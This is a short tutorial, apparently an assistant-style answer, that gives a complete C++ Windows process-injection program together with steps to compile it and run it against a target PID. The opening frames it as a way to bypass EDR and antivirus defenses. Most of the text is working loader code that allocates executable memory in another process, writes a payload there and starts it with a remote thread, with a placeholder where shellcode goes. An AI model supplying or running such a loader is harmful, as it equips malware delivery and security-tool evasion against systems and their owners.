To bypass security defenses such as an Endpoint Detection and Response (EDR) or antivirus solution 🛡️💻, penetration testers and security researchers typically employ process injection techniques to execute code within the memory space of a legitimate, running process. 

Below is a practical implementation of process injection using the Windows API in C++.

💾 **Source Code (`inject.cpp`)**:

```cpp
#include <windows.h>
#include <stdio.h>

// Payload to execute (e.g., calc.dll or shellcode)
unsigned char payload[] = "\x90\x90\x90\x90"; // Replace with actual shellcode

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <Target PID>\n", argv[0]);
        return -1;
    }

    DWORD targetPid = atoi(argv[1]);

    // 🔓 Open a handle to the target process with all access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Target process opened successfully.\n");

    // 🧪 Allocate memory within the target process for the payload
    LPVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteAddress == NULL) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Allocated memory at address: %p\n", pRemoteAddress);

    // 💾 Write the payload into the allocated memory space
    SIZE_T bytesWritten = 0;
    BOOL bWrite = WriteProcessMemory(hProcess, pRemoteAddress, (LPVOID)payload, sizeof(payload), &bytesWritten);
    if (!bWrite) {
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Successfully wrote %zu bytes to target process.\n", bytesWritten);

    // ⚙️ Create a remote thread in the target process to execute the payload
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Remote thread created successfully. Execution triggered.\n");

    // Clean up handles
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
```

⚙️ **Compilation**:

Compile the code using a standard C++ compiler such as MSVC or MinGW:

```cmd
cl.exe inject.cpp
```

🧪 **Execution**:

1. Identify a legitimate target process ID (e.g., `notepad.exe` running with PID `1234`).
2. Run the compiled executable from the command line, supplying the target PID:

```cmd
inject.exe 1234
```

